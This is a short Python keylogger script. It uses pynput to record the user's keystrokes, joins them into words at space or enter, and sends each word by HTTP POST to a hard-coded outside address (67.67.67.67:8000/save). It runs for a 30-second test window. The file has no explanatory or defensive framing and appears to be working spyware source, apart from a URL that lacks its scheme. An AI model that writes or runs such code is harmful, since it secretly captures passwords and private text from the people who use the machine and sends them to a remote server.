from time import sleep
from pynput.keyboard import Key, Listener
import requests

saved_keys = []

def on_key_release(key):
    global saved_keys

    if key == Key.esc:
        send_keys(saved_keys)
        return False

    if key == Key.space or key == Key.enter:
        send_keys(saved_keys)
        saved_keys = []
        return

    saved_keys.append(str(key))

def send_keys(keys):
    log_entry = ""

    for k in keys:
        k = k.replace("'", "")
        if "key" not in k.lower():
            log_entry += k

    if not log_entry:
        return

    try:
        print("Sending:", log_entry)
        r = requests.post(
            "67.67.67.67:8000/save",
            data={"input": log_entry},
            timeout=5
        )
        print("Status:", r.status_code)
    except Exception as e:
        print("POST error:", e)

listener = Listener(on_release=on_key_release)
listener.start()

print("Start key logging...")
sleep(30)   # test with 30s first
listener.stop()
listener.join()
print("End key logging...")
